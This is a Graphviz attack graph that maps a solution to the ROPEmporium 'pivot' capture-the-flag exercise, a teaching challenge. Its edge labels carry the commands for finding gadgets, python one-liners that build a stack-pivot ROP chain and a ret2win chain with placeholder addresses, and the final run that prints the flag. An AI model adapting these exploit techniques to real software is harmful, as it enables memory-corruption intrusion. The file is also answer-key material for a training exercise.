digraph AttackGraph {
  rankdir=LR;
  graph [fontsize=12, labelloc="t", label="Attack Graph (reference) - ROPEmporium pivot"];
  node [shape=box, style="rounded,filled", fillcolor="#F7F7F7", color="#444444", fontname="Helvetica"];
  edge [color="#555555", fontname="Helvetica", fontsize=10];

  start [shape="box", style="rounded,filled", fillcolor="#EAF3FF", color="#444444", fontname="Helvetica", label="Start"];
  node0 [shape="box", style="rounded,filled", fillcolor="#F7F7F7", color="#444444", fontname="Helvetica", label="Pivot address obtained"];
  node1 [shape="box", style="rounded,filled", fillcolor="#F7F7F7", color="#444444", fontname="Helvetica", label="Stack pivot gadget identified"];
  node2 [shape="box", style="rounded,filled", fillcolor="#F7F7F7", color="#444444", fontname="Helvetica", label="foothold_function PLT/GOT identified"];
  node3 [shape="box", style="rounded,filled", fillcolor="#F7F7F7", color="#444444", fontname="Helvetica", label="ret2win offset identified"];
  node4 [shape="box", style="rounded,filled", fillcolor="#F7F7F7", color="#444444", fontname="Helvetica", label="Second-stage ROP chain crafted"];
  node5 [shape="box", style="rounded,filled", fillcolor="#F7F7F7", color="#444444", fontname="Helvetica", label="Initial pivot chain crafted"];
  node6 [shape="box", style="rounded,filled", fillcolor="#E8FFE8", color="#2E7D32", fontname="Helvetica", penwidth="2", label="Flag printed"];

  start -> node0 [color="#555555", fontname="Helvetica", fontsize="10", label="./pivot"];
  node0 -> node1 [color="#555555", fontname="Helvetica", fontsize="10", label="ROPgadget --binary pivot | grep \"xchg rsp\""];
  node1 -> node2 [color="#555555", fontname="Helvetica", fontsize="10", label="objdump -d pivot | grep foothold_function"];
  node2 -> node3 [color="#555555", fontname="Helvetica", fontsize="10", label="objdump -d libpivot.so | grep ret2win"];
  node3 -> node4 [color="#555555", fontname="Helvetica", fontsize="10", label="python3 -c \"from struct import pack; import sys; foothold_plt=0xFOOTHOLD_PLT; foothold_got=0xFOOTHOLD_GOT; pop_rax=0xPOP_RAX_RET; xchg_rax_rsp=0xXCHG_RAX_RSP_RET; mov_rax_ptr_rax=0xMOV_RAX_PTR_RAX_RET; pop_rbp=0xPOP_RBP_RET; add_rax_rbp=0xADD_RAX_RBP_RET; call_rax=0xCALL_RAX; ret2win_off=0xRET2WIN_MINUS_FOOTHOLD; chain=pack('<Q', foothold_plt)+pack('<Q', pop_rax)+pack('<Q', foothold_got)+pack('<Q', mov_rax_ptr_rax)+pack('<Q', pop_rbp)+pack('<Q', ret2win_off)+pack('<Q', add_rax_rbp)+pack('<Q', call_rax); sys.stdout.buffer.write(chain)\" > stage2.bin"];
  node4 -> node5 [color="#555555", fontname="Helvetica", fontsize="10", label="python3 -c \"from struct import pack; import sys; pad=b'A'*40; pivot_addr=0xPIVOT_ADDR_FROM_BANNER; pop_rax=0xPOP_RAX_RET; xchg_rax_rsp=0xXCHG_RAX_RSP_RET; sys.stdout.buffer.write(pad + pack('<Q', pop_rax) + pack('<Q', pivot_addr) + pack('<Q', xchg_rax_rsp))\" > payload.bin"];
  node5 -> node6 [color="#555555", fontname="Helvetica", fontsize="10", label="./pivot < payload.bin"];
}
